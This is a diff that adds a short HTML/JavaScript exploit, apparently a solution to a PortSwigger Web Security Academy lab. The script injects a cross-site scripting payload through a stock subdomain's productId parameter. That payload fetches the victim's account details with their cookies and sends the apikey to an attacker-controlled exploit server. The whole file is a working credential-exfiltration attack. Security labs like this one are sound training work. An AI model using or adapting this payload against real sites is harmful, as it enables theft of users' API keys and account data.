@@ -1,0 +1,16 @@
+<script>
+    var xss = `
+    <script>
+        fetch('https://....web-security-academy.net/accountDetails', {
+            credentials: 'include'
+        })
+        .then(resp => resp.json())
+        .then(json => {
+            fetch(\`https://exploit-....exploit-server.net/log/\${json.apikey}\`, {
+                mode: 'no-cors'
+            });
+        });
+    <\/script>
+    `;
+    window.location = `http://stock.....web-security-academy.net/?productId=${encodeURIComponent(xss)}&storeId=1`;
+</script>
